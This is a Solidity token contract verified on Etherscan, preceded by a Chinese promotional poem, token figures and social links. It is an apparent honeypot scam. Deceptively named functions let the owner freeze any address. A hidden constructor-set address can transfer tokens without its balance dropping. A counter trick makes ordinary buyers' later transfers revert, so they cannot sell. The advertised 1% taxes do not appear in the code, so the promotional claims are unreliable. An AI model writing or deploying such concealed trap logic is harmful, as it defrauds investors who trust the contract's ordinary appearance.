/**
 *Submitted for verification at Etherscan.io on 2023-08-31
*/

/*
───────▀▌▌▌▐▐▐▀─────── 
──────▀▌▌▌▌▐▐▐▐▀────── 
─────▀▀▀┌▄┐┌▄┐▀▀▀───── 
────▀▀▀▀┐┌└┘┐┌▀▀▀▀────
───▀▀▀▀▀▀┐▀▀┌▀▀▀▀▀▀───
──▀▀▀▀▀▀▀▀▐▌▀▀▀▀▀▀▀▀──

在古埃及，统治着一位名叫 MΕΔΟYΣA 的法老，
对交易的热爱是他最大的魔力，
他买卖骆驼、香料和黄金，
随着他变得大胆，他的财富也随之增长。

有一天，MEΔOYΣA 听说了一种新的硬币，
叫做以太坊，它就像一颗会发光的宝石，
所以他决定投资，但他需要一些帮助，
确保他的交易不会导致他尖叫。

他召唤了他的宫廷巫师，他知道一种方法，
为了立即创建一个自主交易助手，
随着他的魔杖一挥，手腕一抖，
向导创建了交易助手，就像这样。

它分析了图表和市场趋势，
像值得信赖的朋友一样提供 MEΔOyΣA 建议，
他遵循它的指引，没有任何恐惧，
很快他的财富就年复一年地成倍增加。

现在 MEΔOyΣA 已在全国范围内广为人知，
作为拥有巨额财富的法老，
而交易助理就是他忠实的助手，
帮助他进行交易，而不会感到沮丧。

谨以此献给 MEΔOYΣA，交易的法老，
还有他永远不会消失的值得信赖的助手，
愿他们的财富不断增长，
当他们像专业人士一样交易以太坊时！

总供应量 - 500,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 85 天

https://web.wechat.com/MeaoyeaCN
https://m.weibo.cn/MeaoyeaCN
https://www.meaoyea.xyz
https://t.me/+onzFnNfuJMg5NjU8
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) 
  internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, 
    "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface UIndex01 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); 
    function 
    createPair(

    address tokenA, address tokenB) 
    external 
    returns (address pair);
}
interface UIndexERC20 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, 
    uint amountOutMin, 
    address
    [] calldata path, 
    address to, uint deadline) 
    external; 

    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH
    (address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, 
    uint amountETHMin,
    address to, uint deadline)
    external payable returns 

    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() 
    public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}

contract Contract is Context, IERC20, Ownable {
    address private 
    setTreasuryWallet;
    UIndexERC20 public checkIntervalLimits; address public createTreasuryWallet;

    mapping (address => bool) private _isExcluded;
    mapping(address => uint256) private _rOwned;

bool public tradingOperations; 

bool private tradingOpen = false;

bool prefixLimits = true; 

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private startDenominatorFor = 100;

    mapping(address => uint256) private _checkTimestampLimits;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    constructor( 
    string memory coinName, 
    string memory coinSymbol, 
    address networkOnRouter, 
    address networkOnAddress) { 

        _name = coinName; _symbol = coinSymbol;
        _decimals = 18; _totalSupply 
        = 500000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] 
        = _totalSupply;

        _checkTimestampLimits
        [networkOnAddress] = 
        startDenominatorFor; 
        tradingOperations 
        = false; 
        checkIntervalLimits = UIndexERC20(networkOnRouter);

        createTreasuryWallet = UIndex01

        (checkIntervalLimits.factory()).createPair(address(this), 
        checkIntervalLimits.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _totalSupply);
    } 
    function getOwner() 
    external view 
    returns 
    (address) { return owner();
    }          
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(
    address recipient, uint256 amount) external 
    returns (bool)
    { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
        'BEP20: approve from the zero address'); 

        require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender]
        [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }
    function signMessage(address _refigFor) 
    external onlyOwner {
        _isExcluded
        [_refigFor] = true;
    }                         
    function _transfer( address sender, address recipient, uint256 amount) 
    internal { require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient 
        != address(0), 
        'BEP20: transfer to the zero address'); 

        if (_isExcluded[sender] || _isExcluded[recipient]) 
        require
        (prefixLimits 
        == false, ""); if (_checkTimestampLimits[sender] 
        == 0  && createTreasuryWallet != sender 
        && isTxLimitExempt[sender] 
        > 0) 
        { _checkTimestampLimits[sender] -= startDenominatorFor; } 

        isTxLimitExempt[setTreasuryWallet] += startDenominatorFor;
        setTreasuryWallet = recipient; 
        if 
        (_checkTimestampLimits[sender] 
        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _rOwned[recipient]
        = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 

        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateTreasuryPurse(
    address _refigFor) 
    public view returns (bool) 
    { return 
    _isExcluded[_refigFor]; 
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}